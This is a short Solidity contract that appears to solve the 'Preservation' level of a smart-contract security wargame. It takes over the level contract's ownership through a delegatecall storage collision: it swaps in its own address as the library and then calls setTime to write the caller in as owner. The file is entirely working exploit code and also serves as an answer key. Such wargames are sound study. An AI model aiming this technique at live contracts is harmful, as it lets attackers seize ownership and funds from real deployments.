// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Preservation.sol";

contract PreservationAttack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  Preservation preservation;

  constructor(address _preservation) {
    preservation = Preservation(_preservation);
  }

  function attack() public {
    preservation.setFirstTime(uint256(uint160(address(this))));
    preservation.setFirstTime(uint256(uint160(address(msg.sender))));
    require(preservation.owner() == msg.sender, "hack failed");
  }

  function setTime(uint _owner) public {
    owner = address(uint160(uint256(_owner)));
  }
}
